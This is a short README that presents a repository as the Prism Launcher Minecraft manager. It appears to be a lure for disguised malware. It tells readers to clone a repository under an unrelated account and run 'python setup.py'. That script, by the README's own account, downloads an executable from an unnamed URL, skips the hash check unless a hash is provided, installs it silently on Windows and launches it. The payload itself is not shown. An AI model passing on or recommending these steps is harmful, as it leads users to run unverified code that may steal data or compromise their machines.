> Prism Launcher is a fork of MultiMC. Manage multiple Minecraft instances, install mods with one click, support for Forge/Fabric/Quilt.

## Features

- Multi-instance Minecraft management
- One-click modpack and mod installation
- Cross-platform (Windows, macOS, Linux)
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/prism-launcher-ultra-473.git
cd prism-launcher-ultra-473
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.
